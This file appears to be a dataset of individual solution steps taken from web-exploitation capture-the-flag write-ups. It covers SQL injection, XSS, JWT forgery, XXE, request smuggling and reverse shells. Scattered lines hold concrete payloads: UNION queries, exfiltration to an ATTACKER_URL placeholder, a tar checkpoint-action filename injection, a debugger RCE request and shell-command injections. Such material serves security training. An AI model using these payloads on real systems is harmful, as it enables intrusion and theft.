    "Read the function getBrowserWithTimeout and note that a remote debugging port is exposed which normally allows commands to be sent to the browser through the DevTools protocol",
    "Realized that 'process.env.npm_execpath' can be controlled since it is not set by default",
    "Viewed the source code of the 'santa_mon.sh' program. Observed that the buttons in the web interface do indeed run standard Linux commands. Also saw that if there is an argument to the program, it is executed as a command.",
    "Create a function 'get_hidden' in the Python script that takes a URL as an argument, sends a GET request, extracts the response text (HTML), and uses regular expressions to find specific fields",
    "Use the remaining dumped credentials to login to the Admin page and access the flag.",
    "Edited the existing jwt token's payload to {'user':'admin'} using jwt.io",
    "Received a message from the '/vim/quit/' endpoint that suggested using a query parameter.",
    "Learned that the 'name' parameter is stored using PHP serialization and can be located in the '/proc/self/fd/9' file",
    "Obtained the flag `MetaCTF{if_brute_force_doesnt_work_use_more_brute_forceeeeeeee}`.",
    "Attempted to open a bind shell on port 4444 to enable running the `readflag` binary",
    "Tried to implement a similar mechanism to the CSRF mechanism used earlier to grab the password.",
    "Derive a URL that starts with 32 bytes of hexadecimal characters using leading 0's and convert your public IP address to octal form using an octal IP address converter",
    "Analysed the `main.dart.js`, which is the Flutter app compiled by `dart2js`.",
    "Communicated with the server using a complete request with the SQL injection payload to extract data",
    "For each endpoint, tried all HTTP verbs to discover the correct one to use.",
    "Observed that 'Requests_On_Steroids' function in 'main.py' supported Gopher protocol to communicate with any TCP server",
    "Through the PCAP analysis, identified the user 'true.grit@umbccd.io' and learned about the 'forgot password' functionality and how it works.",
    "Accessed the website: http://toomanycredits.tamuctf.com",
    "Accessed the website and found out it is an online calculator",
    "Tried to bypass CSP to inject XSS",
    "Use tools such as jwt.io to craft a valid JWT with `31337` identity and signed with `dawgCTF?heckin#bamboozle` secret",
    "Inspected the source code of the website",
    "Submit form and monitor the Network Tab responses for a JWT in the 'token' header.",
    "Checked the format for XML POST request by clicking a button on the website and examining the request format in the 'Network' tab of the developer tools.",
    "Dumped all tables and columns",
    "Tried to submit a note with spaces and received an error message.",
    "Devised a strategy to manipulate the content of the cowfile. Realized that the submitted string is appended after '$the_cow' variable in the script.",
    "Checked whether the generated data from both the hexadecimal values is the same or not",
    "Retrieve and analyze the JavaScript file from the webpage.",
    "Finally, found the flag 'ACSC{it_is_hard_to_name_a_flag...isn't_it?}'.",
    "Check the cookie where the admin is set to false. Change its value to 'true' to get redirected to the flag page",
    "Attempted to pass an object in place of password, with a known attribute",
    "Server logs received requests, capturing the admin's cookie",
    "Uploaded changes and received flag indicating successful completion of challenge",
    "Used knowledge of these constraints to aim exploitation efforts at the more forgiving 'email' parameter.",
    "Ran into an issue with the 'search' feature checking for 'window.enable_experimental_features', which did not originally exist.",
    "Identified a `/flag` endpoint that had been inaccessible due to lack of the appropriate cookie.",
    "Set the host header so that the renderer visits our attacker-controlled site.",
    "Combine all of the parts to form the full flag submission",
    "Leaked data byte-by-byte by hashing it and using as password for new account",
    "Given a login page that does not contain any JavaScript code",
    "Ran the script and obtained the flag 'MCA{al3x4_5et_a_r3minder}'",
    "Received the flag in the body of the returned page",
    "Used 'request.args' to bypass banned characters",
    "The web application does not check for duplicate parameters, permitting the submission of an additional, identical 'n' parameter",
    "Find HTML injection through the 'src=' parameter",
    "Review AWS managed rules changelog and corresponding documentation for mitigation strategies.",
    "Identify Base64 encoded string `aW1nMS5qcGc=` as `img1.jpg`",
    "The first step was examining the `package.json` file found in the site source",
    "Identified manipulating capabilities of Apache2 which allows directory switching",
    "Learn that the += operator is not equivalent to an operation x = x + y in Python as it is in some other languages. This is because += performs the operation in place when possible and subsequently tries to assign the result back to the variable.",
    "Send the GET request `/getFile?file[]=a&file[]=b&file[]=c&file[]=d&file[]=/../flag.txt&file[]=.&file[]=js` to the server",
    "Verify that the above indicates a Blind SQL Injection vulnerability",
    "Inspect the source code of the website",
    "Retrieved the flag",
    "Use the /find endpoint to inject a Set-Cookie header to set the admin's ID cookie to your own session.",
    "Flag 'accessdenied{1t_w4s_h1dd3n_h3r3_594a9sd}' was found in the JavaScript file",
    "Triggered the payload through an iframe by entering that into the webpage's input field, with the URL in the format `http://challenge.nahamcon.com:32132/exploit?text=%3Ciframe%20src=%22https://ATTACKER_URL/exploit.html%22%3E&color=%2324d600`",
    "Found a cookie with the name 'flag' and a value in Base64",
    "Sending the crafted request to the server to return the system flag",
    "Tried accessing a document called 'flag'",
    "Created PHP payload to bypass server checks, ensuring both the user's name and password would be equal to the secret",
    "Used the discovered vulnerability to write a request to the root directory with the filename 'lol.txt' and the content 'HACKED'",
    "Identify another part of the Nginx configuration that preserves request headers when requests are forwarded to Gunicorn",
    "Register a user with the malicious username input",
    "Retrieved the flag 'CTFSG{All_T00_W3ll_T3n_M1nutes_V3rs1on_Taylors_Version}'",
    "Retrieved the flag, '35C3_M1Cr0_S3rvices_4R3_FUN!'.",
    "Included 'GET /flag HTTP/1.1' and a dummy value as the request body which fooled HAProxy into treating it as part of the first request.",
    "Understanding the functionality of the `/new` endpoint from the downloaded json",
    "Send the encoded payload through the cookie header",
    "Access the provided URL using a web browser",
    "Printed the 'flag' file content using a bash script, encoded it via Base64 and passed it into the cookie",
    "Found blog post page '?p=1' where we can leave a comment",
    "Understand that the list was already successfully modified by the time an error was raised in the assignment step.",
    "Verified the server code location from the provided Dockerfile as '/code/app.py'",
    "Identify weak point in code: where negative flag price is not validated in 'sellFlag' function",
    "A second dummy 'GET / HTTP/1.1' request was placed after which was treated as a separate request by HAProxy",
    "Gained access by passing the OTP check, ensuring the user script run by application was active",
    "The query '123' UNION SELECT 1, sqlite_version(), 3;--' reveals that the site is using SQLite",
    "Noticed a 302 found page containing some HTML and JavaScript",
    "Noticed an undeleted Tweet that contains the password by another user.",
    "Used the AWS credentials found in the 'config' schema to download the contents of an Amazon S3 bucket",
    "Discovered that the goal was to read the 'app.secret_key' value",
    "Attempted and failed to exploit this vulnerability using standard payload",
    "Visited the website with the updated cookies to retrieve the flag",
    "Crafted a malicious XML payload to exploit XXE and read the /etc/passwd file.",
    "Minified the code to be read as XSS",
    "Tested an approach where the username field contained blank input enclosed in two apostrophes, and the password field contained a single apostrophe",
    "Understood that the input had to satisfy certain constraints, chiefly that 'name' could only contain alphanumeric characters, and 'email' had to pass RFC5322 validation.",
    "Obtained new AWS credentials and used them to access DynamoDB",
    "Given the instruction that there is something inside the HTML page",
    "Used the X-Accel-Redirect PHP script to create a request for '/admin../uberadmin/flag.txt'. This exploited the Off-by-Slash bug and returned the real flag in the 'uberadmin' directory.",
    "Check token with jwt.io, discover it's using HS256 algorithm",
    "Printed the flag using 'cat ./system/of/a/down/flag.txt'",
    "Wrote the final payload, uploaded it to the server, and used the same request to read the flag from the '/readflag' binary",
    "Subsequently, create another file '--checkpoint-action=exec=sh shell.txt' with nothing inside. This just serves to pollute the arguments for tar command and passes the extension check due to .txt extension.",
    "For each possible character, check if it is part of the flag by verifying if the count returns 1",
    "Retrieve the flag",
    "Read the 'README' file and found a password hash '6f246c872cbf0b7fd7530b7aa235e67e'",
    "Decoded the base64-encoded string to 'USERNAME-YEAR-MONTH-DAY'",
    "Performing URL enumeration with 'dirb' tool identifies server directories",
    "Found a flag in the profile of dennisb@uupeye.edu",
    "For each endpoint, tried all HTTP verbs to discover the correct one to use.",
    "Identify that the variables $blocked, $special_block, and $$special_block are defined before the 'eval()' statement and hence can be referenced in the eval-ed code",
    "Used the default credentials to login.",
    "Understood that the challenge is to pass checks where there should not be any dots, double slashes or non-ascii dot in the iframe value in the url.",
    "The retrieved data from the 'flag' document contained the lyrics of a song and the required flag",
    "Test LFI vulnerability by Base64 encoding `index.php` and `getimg.php`, and using these as parameter values for `getimg.php`",
    "Noted that incoming data was saved into HTML files",
    "Decided to craft a command injection payload without using spaces to run 'curl http://localhost:3000/get_flag' which in turn will return the output to us through the webpage.",
    "Crafted a request `confidential_documents=kontammadur_klanvour.dev.local%3A5001%2Fconsole?__debugger__=yes&cmd=__import__('os').listdir('/')%3b&frm=0&s=IUrsy36AKlZ2zvT1vaPc` to initiate Remote Code Execution (RCE)",
    "Understand that the above request smuggling method won't allow capturing the second response from Puma",
    "Discover the flag in the 'target_credentials' database, under the 'secret_key' column, which is 'rwctf{t0-h4ck-$kynet-0r-f1ask_that-Is-th3-questi0n}'.",
    "Create a XSS payload that fits within the 75 character limit to be stored. In this case, JavaScript code using `document.cookie` to control variables.",
    "Direct access to the flag was not successful",
    "Note that the token uses the RS256 algorithm, implying the requirement of a private and public key",
    "Generated the md5 hash for both binary data and checked if they matched",
    "Attempted to bypass `is_valid_email(email)` function but failed as the function doesn't allow special characters like '%'",
    "Understood that the invalid characters help bypass the regex validation in the PHP script",
    "Downloaded the 'pack-names' file from the 'repository' folder and replaced the current 'pack-names' file.",
    "Identified that the challenge seemed to involve reCAPTCHA, indicating the previous solution may not have been intended and deciding to look for another way to solve the challenge.",
    "Injected the following code to make the bot click our link and reveal the flag: [[lol\"></audio><a/udio id=\"like\" href=\"http://hax.perfect.blue:6969/lel\">HAXXX<audio src=\"]]",
    "Modified the JWT to use the RS256-to-HS256 exploit to gain access as an admin user.",
    "Accessed the newly public gallery and found the flag.",
    "Found a flag in the 'users' schema, and various other important details in other schemas",
    "Injected two `reCAPTCHA` buttons to manipulate the `statusCode`.",
    "Executed another HTTP request to extract the content of the 'whatsthis' table",
    "Observed the HTTP response header, it indicated various constraints including inability to include external scripts and styles, embedding the site in iframe on an external site",
    "Inspect the cookies provided upon account registration",
    "Successfully logged into the admin panel by injecting an address into the URL parameter.",
    "Visited: https://yeunote.ctf.yeuchimse.com/ and assessed the functionality of the web page.",
    "Identified that the login site is vulnerable to SQL injection",
    "Wrote a Python script to automate the URL enumeration and flag discovery",
    "Refreshed the page to reveal the flag 'aj9dhAdf4'.",
    "Second step: Investigated the search function which uses a 302 server-side redirect to '/view' if a note matching the query is found.",
    "Eighth step: Made the attacker server redirect to the target URL after 19 redirects.",
    "Identify a web application vulnerability, specifically XS Leaks, from incoming responses at the '/checkbalance' endpoint.",
    "If a guess was not successful (denoted by the flag remaining False after the loop), it means the full password has been guessed. Break the infinite loop and exit the script.",
    "After collecting all 5 captchas, click on 'GET FLAG' to obtain the challenge flag",
    "Constructed a regex pattern to extract only the string 'P4s5_w0Rd'.",
    "Use the created web shell to explore the file system and find the flag MetaCTF{wh4t??lfi_1s_ev0lv1ng??}.",
    "Determined that SELECT and UNION keywords were being filtered by regex but stacked queries were allowed.",
    "Used the 'strings' command to extract the flag from the binary data in the 'print-flag' file",
    "Noticed three endpoints (/status, /rocketLaunch, /fuel) in the response",
    "Inserted HTML through 'preview' feature to demonstrate DOM clobbering, thereby enabling 'enable_experimental_features'.",
    "Used the internetwache GitTools to dump file contents of websites.",
    "Discover the use of the 'os.system()' method to execute the tar command when downloading all uploaded files, indicating potential wildcard injection vulnerability.",
    "Performed a directory busting scan using gobuster to discover potential directories or files.",
    "Confirm the vulnerability by requesting /post.php?post=../../../../../../etc/passwd.",
    "Identified that there is a caching mechanism where each user's JWT key is stored in a Redis cache after logging in. Noticed that the key is only stored for 2 seconds.",
    "Located a line of PHP code that pops up an interesting file within the error logs: require dirname(__DIR__).'/config/bootstrap.php';",
    "Note that the initial SQL injection tactic yielded access but not the password",
    " Noticed that the site's PHP code allows for the crafting of 'preg_replace'",
    "Formed a hypothesis that the page might be checking the client's IP to decide if it's an admin.",
    "Started the app with `PORT=8080 npm run start` and noted the creation of a `storage.db` file",
    "Analyze the given server.py file to understand the workflow of the Flask web server.",
    "Discovered the site is also vulnerable to Local File Inclusion (LFI)",
    "Used the same approach as above, but filled both the username and password fields with blank input enclosed by two apostrophes, and found that there was no error",
    "Entered the combined password into the portal",
    "Loaded the page at `/` which simply says `Hello Mars!`.",
    "Use the lazy-loaded image to detect if a scroll occurred when a text fragment is parsed in the URL",
    "Went to the '/tmp' directory",
    "Downloaded and extracted the source code from /src.tgz.",
    "Noticed that the public key used for the JWT token handling is stored in the '__dirname' directory",
    "Identified task to bypass countermeasures to gain full control of the $whoareyou variable",
    "Identified that the binary calls the 'id' command three times, with and without privileges",
    "Craft a request to smuggle a request to /admin in flagportal to perform an Server Side Request Forgery (SSRF)",
    "Retrieved the CTF flag",
    "Replaced the original signed cookie with the new one generated when the secure cookie value was changed to 'true'.",
    "Received a response indicating a need for a valid jwt token",
    "The original payload did not work, leading to further research and discovery of a known issue in 'nunjucks' that it was having issues with single line payload",
    "Test this step locally with a python command that should create a reverse shell.",
    "Found the secret key for the debugger hardcoded in the JavaScript",
    "Accessed the meme generator web application",
    "Identified additional server check constraints for an additional GET parameter 'caption'",
    "Sent a GET request to '/localisation-file' to retrieve the key file",
    "Downloaded all available logs with wget to search for the flag",
    "Iteratively added a character to the flag if its index matched with the desired one",
    "Found that the iframe's message is received and processed in /demo, with data POST-ed to the /api/filter endpoint and sanitized HTML added to document.body.innerHTML",
    "Realize that the flag can be attained with more than 1000 CAPTCHA solves.",
    "Realized application is running Flask with MySQL, similar to previous Drobots challenge",
    "Change the location of the pop-up back to the exploit server.",
    "Switch strategy and attempt to upload an HTML file containing a simple JavaScript function (such as an alert)",
    "Constructed a payload which utilises 'x:script' to exploit the vulnerability",
    "Identified content lengths as indicators of page existence due to uniform content length of Not Found (404) pages.",
    "Accessed files such as '.git/HEAD'",
    "The payload executed successfully and leaked the contents of the admin page",
    "Identify the logic behind the application's authentication.",
    "Identified a hint in the website about changing language potentially involving code str_replace",
    "Attempt to open 'robots.txt' on the website",
    "Joined the 'class' string with preceding and ending '__' characters using 'join' filter",
    "Created a code snippet: `EOCA$eyes=`ls`;print '$eyes';` to potentially gain information about the directory. It was noted that the 'A' placeholder in the code has to be replaced with `\\n (`0x0a`) in a proxy.",
    "Identified that 'child_process.execFileSync' is being called in 'preinstall.js'",
    "Used crafted cookie value to print the hint, and then analysed the hint",
    "Identified that the website is GitHub Pages site and does not require proof of domain ownership, letting an attacker set up a GitHub Pages site with a subdomain that matches the site domain",
    "Plans to send requests containing SQL to the server.",
    "Located the flag within the public news_article table of the database dump",
    "Noticed server-rendered pages as screenshots.",
    "Hosted the payload on an external website",
    "Identify the application listening on port 11111 as a web application",
    "Understood 'this.service.getAnswer()' led to 'this.http.get('/api/answer')' as it's a part of Angular\u2019s internal methods showing it was fetching '/api/answer' from server-side",
    "Code a web page that uses a Promise to try and load a URL, if the URL loads, the port is open and the script logs it and attempts to send this information to a remote server set up for this purpose",
    "Since there's no exploit in 'flagchecker.c', explore other files in the repo",
    "Acknowledged this version is vulnerable to a recent path traversal zero-day",
    "Logged in using the extracted credentials to successfully obtain the flag from the challenge",
    "Opened the `storage.db` file with a SQLite database reader to view stored data",
    "Understand how to modify user's profile and upload images, try XSS payloads on different input fields but discover that JavaScript is blocked",
    "Decode the base64 content to reveal a PHP serialized class",
    "Analyzed the website's HTML and found a comment indicating the source code is at /src.tgz.",
    "Ran the script until the flag (password) was fully discovered",
    "Craft another post request to create a secondary note, passing the malicious note_id from the previous step",
    "Use the identified class to execute the 'id' command remotely",
    "Decoded the flag from the base64-encoded string received from previous step",
    "Discovered a column named 'whatsthis'",
    "Realized 'echo exec(...)' only returns the last line of the output",
    "Recognized that the challenge name and challenge statement hinted at SQL injection",
    "Found a PHP object in the decoded cookie with three attributes: 'username', 'admin', and 'profile_img'",
    "After object injection, the expected solution was constructed as 'O:8:\"stdClass\":4:{s:8:\"username\";s:11:\"D0loresH4ze\";s:8:\"password\";s:13:\"rasmuslerdorf\";s:13:\"_correctValue\";N;s:3:\"mfa\";R:4;}'.",
    "Obtain your current cookie by going to 'Inspect' -> 'Storage' -> 'Cookies' and get the cookie's value",
    "Claim the flag to complete the challenge",
    "Spotted a string within the JavaScript scope which represented the flag: _0x256968: 'HarekazeCTF{j4v4scr1pt-0bfusc4t0r_1s_tsur41}'",
    "Leveraged the fact that the server follows redirects and used PHP to redirect to 'localhost:8081/flag' to access the flag",
    "Once the flag is found in a response, the script prints out the corresponding 'likeCookie' value and stops the loop.",
    "Write a LaTeX script to build the path and read the flag using the isolated '/' symbol. The script defines sections of the path to the flag, reads index.html and isolates the '/' character, builds the path to the flag, and reads it.",
    "Use Wireshark to read the packet capture file.",
    "Realized a '<script>' payload wouldn't work due to Content Security Policy blocking arbitrary scripts without a randomly-generated nonce.",
    "Noticed that the PHP code showed that 'flagman69' username would output the flag",
    "Extract the flag from the response received on the callback URL.",
    "URL-encoded the new payload.",
    "Used the script to check \"whoami\", list the files, and retrieve the flag in the file \"flag.txt\"",
    "Discovered that the website is using PHP eval() function",
    "Determined the solution for the crossword puzzle.",
    "Filtered output to get only the relevant 'P4s5_w0Rd' string using '/etc/alternatives/nawk'.",
    "From this, infer that fetching passwords is possible by comparing password characters to the alphabet in the payload",
    "Tested the ability to execute a malicious payload via the `unserialize()` function in a test JavaScript file",
    "Ran 'insecure' to obtain a root shell and confirm the malicious 'id' could be run as root",
    "Came up with a URL payload that includes the path '/index.php/config.php/%ff?source' to exploit the 'basename()' function while bypassing the regex validation",
    "Executed '/usr/bin/strings /readflag' to read strings from the binary without actually running it.",
    "Identified the challenge as involving wkhtmltopdf, a tool that translates HTML content into a PDF.",
    "Found a clue in the same comment to check 'd4rks0c1ety' page for the rest of the flag",
    "Decided to open the Network tab on the Google Chrome console to see backend activity",
    "Used '127.0.0.1;echo $PWD' in URL to reveal current directory as '/var/www/html'.",
    "Test inputting content in MiniMag and BBCode format, which is accepted as 'format' in the post submission request data",
    "Create a new regex matching the 'flag{randomString}' pattern, using the '|' operator",
    "Enable logging through an API request to '/api/preferences' with the request body containing a 'logging' attribute set to true.",
    "Adjust necessary parameters in the python script",
    "Publicly accessible functionality: '/dogooo/deets/<postid>' where comments under a picture can be inserted is identified",
    "Decrypted the jwt token using jwt.io which revealed the payload to be {'user':'guest'}",
    "Change the browser's user agent to IE 6.01 through developer tools in the browser",
    "Retrieved a link leading to flag.png file after passing the password",
    "Exploiting Shellshock to enumerate root directory and finding 'flag.file'",
    "Submit the payload (__import__('subprocess').getoutput('cat /flag/flag.txt')) through the form",
    "Experiment with creating a URL that just hits the length limit and observe a redirection to an 'about:blank#blocked' page when the limit is exceeded",
    "Trigerred an error by submitting a malformed statement",
    "Identify the provided file is a packet capture (.pcap) file.",
    "Identify vulnerability to a SQL Injection within the query",
    "Find that the username is used after authentication",
    "Used the obtained JWT to authenticate using the /api/normal endpoint, received a message stating flags are not for normal users.",
    "Used the value ':wq' for the 'exit' parameter.",
    "Identify that an attacker has set up a keylogger which sends each pressed key to an external server as an encoded message.",
    "Observed that a request to '/save.php' appends an entry to a log file containing the cookies and value of 'X-Access' header",
    "Visited the website http://easy-php.darkarmy.xyz/",
    "By fuzzing username inputs, finding that anything after a whitespace is removed.",
    "Executed an HTTP request using the base constructed, trying to enumerate DB tables",
    "For a more reliable solution, consider setting up a personal DNS server: one that will temporarily respond with a public IP (when the Python program is checking), but then resolve to the local IP when the GET request is made.",
    "Identified that 'X-Forwarded-For: 172.16.2.24' allows access to 'login.php'.",
    "Encode the SQL injection payload into 'multipart/form-data', thereby bypassing WAF 'Skynet'.",
    "Step 4: While the condition to receive the CTF password (flag) not met, the script will continue iterating.",
    "Analyzed initial JavaScript code for vulnerabilities",
    "Finally, successful completion of POST request was achieved with all required parameters, capturing the flag",
    "Identified notable shell script 'findaas' inside '/ctf'",
    "Decide to generate the token from one IP, then switch to a different IP to discover the generated token",
    "Understood the structure of the 'Login' object which consists of a 'User' object and an MFA token",
    "Turn the string 'Hello_Rules' into lowercase using Python's string method '.lower()'.",
    "The hint for this challenge talks about being stuck in debug",
    "Construct a page hosted on a domain starting with 'localhost' and submitted to '/share', this script sets the auth token by making the bot visit 'http://localhost:7070/auth', opens a WebSocket to 'ws://localhost:7070/quote' and exfiltrates the data to 'http://ATTACKER_URL'",
    "Identified the '.git' directory and source code were exposed on the webserver",
    "Experimented with each method and found that 'POST' and 'PUT' returned a different result.",
    "Performed a POST request to the /api.php endpoint with 'id', 'pw', 'c', 'c2', 'pas', and 'db' parameters, using path traversal to access the flag.",
    "Visiting the '/login' route presents a form to fill.",
    "Understood that I need to create a controlled filename and when __destruct would be called. This would lead to a command execution in the create_thumb function.",
    "Scanned the 'flag_db' DynamoDB table to retrieve the flag",
    "Inferred the challenge was to exploit the `theme` parameter to inject XSS",
    "Looked into static/css/main.css and found a potential hint: c4n_r3ve4l_",
    "Deducing from the image that the language might be Swedish",
    "Created a custom 'Login' object where '$mfa_token' is a reference to the '$_correctValue' attribute to bypass the MFA token check",
    "Using rockyou.txt to brute force the JWT secret with John The Ripper.",
    "Found that the Gopher adapter used was modified from a GitHub gist to remove '/_' in the URL's path",
    "Identified the remote Flutter widget file signature.",
    "Observe the output, noting it as the flag",
    "Discover a schema file 'schema.prism' with a 'User' model that comprises an 'isAdmin' field set to 'false' by default",
    "Accessed migrate.php",
    "Visited route '/?page=payload' with the uploaded PHP file to find a lot of printed information",
    "Once the injection payload has been executed, check that the accessor for 'key' has been overridden and behaves as expected, for instance by returning a '[object Object]' string and not allowing itself to be overridden by a new value.",
    "Construct a custom PHP script to create and serialize an 'access_log' object with the log_file set to '../flag', then encode this serialized object with base64",
    "Use Dirb to look for hidden directories or files in the website",
    "From the 'git diff' command output, recognized prior presence of a file named 'flag.jpg' which was later removed",
    "Identify that, after login, a cookie is mechanically set with the flag '35C3_LOG_ME_IN_LIKE_ONE_OF_YOUR_FRENCH_GIRLS'",
    "Realize that the Javascript function can print itself, including comments, if its name is returned.",
    "Accessed flag after successful bypass of all server checks",
    "Repeat this until the entire flag ('flag{4lly0Urb4s3}') is discovered",
    "Created and uploaded a .php16 file for remote code execution",
    "Attempted to use the /api/admin endpoint using the obtained JWT, received a message that the user is not an admin.",
    "Discovered a column named 'whatsthis'",
    "Used LFI to execute this php command, returning the process ID",
    "Realize that the flag is in the environment variable",
    "Unzip 'poc.odt' to access 'content.xml'",
    "Added an extra parameter 'account[role]=admin' to attempt gaining admin privilege",
    "Find the flag inside the hidden sheet",
    "Upon redirection, chose 'discord' as the OAuth2 Identity Provider.",
    "Downloaded the provided HTML file",
    "Found a successful login attempt among the batched requests.",
    "Discovered that URL capture service takes a screenshot of a submitted webpage URL",
    "Create a file 'shell.txt' with the desired payload. Here, create a reverse shell back to attacker's machine.",
    "Connect to the provided website",
    "Submitted a note using only characters from a-z and A-Z, which was accepted.",
    "Flag was successfully obtained: HarekazeCTF{j4v4scr1pt-0bfusc4t0r_1s_tsur41}",
    "Found database config info in config.py",
    "If no request is received for a particular character, it is concluded the extra div was rendered and search was a correct guess.",
    "Followed the directory path indicated in the scan result to explore further",
    "Added phpinfo() to the code in the PHP shell to get information about the PHP configuration",
    "Build a HTML page to automated this process, using a JavaScript script that opens a window, checks redirection, and then guesses a number based on the window's history length.",
    "Constructed another GET request to execute 'ls' command on the server using `subprocess.Popen`",
    "Step 1: The author identifies it as a SQL Injection challenge and sets up the environment to exploit it.",
    "Then try the payload: {\"username\": \"admin\", \"password\": {\"$gt\": \"z\"}}, which returns 'false'",
    "Manipulated the `widget` parameter to cause a traceback.",
    "Passed a random value which revealed that a 'vim' command must be used.",
    "Tried a wrong HTTP verb which made the server return all allowed methods.",
    "Write a PHP program to check if characters are converted to underscores and enumerate these characters",
    "Missed the potential for using an SQL injection into the password field as an authentication bypass.",
    "Observed that 'c' parameter in requests was used to manipulate the user session, either to sign in, sign up, or sign out.",
    "Noticed that causing a TypeError triggers the 'require('./usage')'",
    "Downloaded the missing repository files as indicated by the error.",
    "Find the secret_key 'redraider'",
    "The script continues in this way until the full password is discovered",
    "Instructed to locate the origin point of most attacks and calculate the number of cameras within 1.3km radius of that point",
    "Tried to perform an HTTP request smuggling attack by sending two get requests separated with 65534 empty spaces",
    "Checked for possible exploitations in the Java Servlet and found that it was vulnerable to log4j 2.14.1",
    "Provided a series of directory traversal characters in the request (/%2e%2e/%2e%2e) aimed at accessing server roots",
    "Research if and how PHP manipulates input parameters' names to remove whitespaces and convert characters into underscores",
    "The HTML file connected to a Firestore environment",
    "Step 3: The author sets a condition to set these parameters based on the specific challenge, as this solution also works for the 'Gate Keeper' challenge.",
    "Found '/opt/yarn-v1.22.19/preinstall.js' in the container",
    "Examine the 'challenge/routes/index.js' file. We find an '/api/submit' endpoint which the frontend sends user data.",
    "Script creates an 'img' element with src set to contain document.cookie",
    "Used iterative deepening to discover each subsequent character of the password by injecting similar code into the input box with an updated prefix",
    "Tried to generate 'oauth tokens' for the flag note in order to share the generated URL with the admin.",
    "Passed an arbitrary character(',') into the X-FORWARDED-FOR HTTP header to manipulate the IP address parameter in the SQL query. The returned error message suggests that the database used is an SQLite database.",
    "Decoded string revealed to be the flag.",
    "Went to a third-party website to generate an introspection query for graphql which returns all the content of a graphql schema",
    "Managed to work with BurpSuite by placing a zero in between the two GET requests.",
    "Identify that the code revolves around an XML parser",
    "Identify that the Python microservice runs on Flask's built-in server which, by its insecure nature can be susceptible to HTTP request smuggling attacks",
    "Discovered that a cookie named 'otadmin' must be passed, which must follow the regex format /^{\"hash\": [0-9A-Z\"]+}$/",
    "Formulated a HTTP request using the payload and made a 'POST' call.",
    "Analyse the challenge which involves a website that can't send double opt-in emails",
    "Set the Content-Type as 'application/json'",
    "Creating and uploading a zip file with a `run` bash script that gives a reverse shell",
    "Utilized the SSRF exploit to write to the created symlink, overwriting the index.html file",
    "Created a .htaccess file to tell Apache to interpret .php16 as a PHP file",
    "Set the X-Forwarded-For header to 127.0.0.1 to emulate local host client access, aiming to access internal files",
    "GET query parameters were added to the messages before verification",
    "Try a bypass method by uploading HTML files disguised as image files (using a GIF header for instance)",
    "Discovered database information contained within the config.py file",
    "Discovered an `AdminPage` and a `/api/flag` endpoint that is fetched using `postRequestWithCookies`.",
    "Uploaded the disguised phar file and used the XML External Entity vulnerability to call it with the phar:// uri.",
    "Noticed that the output in the /login POST route has not been stringified, which gives the possibility to pass an object in the query statement",
    "Scheduled to do a UNION based injection to dump the database to get the flag",
    "Find usage of 'eval' in util.py that is being used on data from POST request.",
    "Identified the source code of the application that by analyzing a Python script.",
    "Wrote a script to use a cache which stores all attempts for generating the challenge strings.",
    "Decide on achieving remote code execution but realize it requires ability to write to a file on the server.",
    "Work out bugs in the Python code.",
    "Recognized that the 'with' HTTP GET parameter could be manipulated.",
    "Made another GET request to obtain the signing certificate from the platform.",
    "Used the exploit to read the flag.",
    "Successfully obtained the flag {you-have-to-eat-tomato-yume-chan!} as a result of the bypass",
    "The challenge was to host 'https://chall1.jsapi.tech' on GitHub. This site provided an HTML interface for writing and saving notes.",
    "Injected an 'a' tag with the id=like since the bot clicks this element.",
    "Accessed URL to start the CSS Injection challenge",
    "Attempted authentication bypass with advanced payloads",
    "Based on SQLmap results, one can determine that there are two databases available 'ASISCTF' and 'information_schema'.",
    "Pivoted from the previously found IP address and scanned it, finding a HTTP service.",
    "Analyzed given PHP script to understand the functionality of different methods.",
    "Created a bash script that would only spawn the shell if the caller is root",
    "Find the first part of the flag as a comment within the HTML",
    "Observed that Baby Eval is a Node app with a path / that lists information including server source code",
    "Sent these URLs to the bot, base64 encoded image data was sent to the requestbin",
    "The source code shows when a GET request is sent with 'source' as a parameter, it reveals the source code of the file",
    "Understood that the application can be exploited via a XXE attack.",
    "Analysed the server's CSP policy and identified a potential vulnerability with 'www.youtube.com' hosting a JSONP endpoint",
    "Fetch the screenshotter service and put the result in an iframe to display in the screenshotting service",
    "Using the information obtained from the previous step, constructed a Python script to automate the process of discovering the next character in the password by sending POST requests with a payload that uses the SQL LIKE clause for each possible character",
    "Collected from the error message that the username and signup date were passed into the SQL query without sanitization",
    "Connected to `https://web0.ctfsecurinets.com/_profiler/open?file=config/bootstrap.php' and found the entire path to an environment file",
    "Two actions are available on the website, 'an excerpt' and 'read online', with 'read online' opening link from an unrelated domain.",
    "Given function `shellme()` gets defined in the shared object `shellme.so`",
    "Clicked on the link to enter the chat.",
    "Identify a token structure that, if manipulated, could allow for unauthorized purchases from the 'flag store'.",
    "Guessed that the following endpoints were present: '/circle/one/', '/two/', '/square/', '/com/seaerch/', '/vim/quit/.'",
    "The flag is retrieved using the query '123' UNION SELECT flag, null, null from more_table;--'",
    "Send a request to patch the new user's role to 'Admin'.",
    "Retrieved the flag from the decoded base64 response",
    "Leverage the property of SQLite that it can concatenate large integers as they were strings, such as '9223372036854775807||9223372036854775807' to give '92233720368547758079223372036854775807'",
    "Here we have a service which lists all the items in the mentioned dir",
    "Identified and connected to port 11111",
    "Performed username enumeration utilizing the `dirb` wordlist",
    "Create a policy that only allows form submissions to a specific domain, so queries leading to a different domain will be blocked",
    "After encoding the session, obtain a new session cookie as output.",
    "Identify the '/queue' WebSocket endpoint where the flag resides, with the conditions that the WebSocket client's origin must start with 'http://localhost' and the client having the correct 'auth' cookie set",
    "Created a custom wordlist of potential log file names based on the URLs of existing logs",
    "Sent a POST request to '/show_secret' (using the stolen 2FA codes) with the aim of stealing the admin's secrets",
    "Retrieved the final flag: 'flag{y4m_y4m_c00k13s}'.",
    "It is calculating the SHA256 hash of concatenation of 'password' and 'salt'",
    "Used backticks to confirm RCE by sending the `echo 'X'` command and receiving a QR code of the `X`",
    "Make a HTTP request to 'http://0177.0.0.1/admin-status' from the localhost",
    "Created a Python script that opens a reverse shell and deployed it as a Lambda function",
    "Noticed that 'mootools' JavaScript library is used and is vulnerable to client-side prototype pollution",
    "Send POST request to /feed.php with XML code structured to expose data from /etc/passwd file.",
    "Authenticating into the system with these credentials allowed for new users creation",
    "Use hashpumpy function to get the contents of package.json and establish that the password length is `22`",
    "Understood that there is a blacklist filter for '#' and '=' symbols",
    "The web application conducts a check for blank entries; 'n' values cannot be blank",
    "Determined that this version of Apache had a known vulnerability",
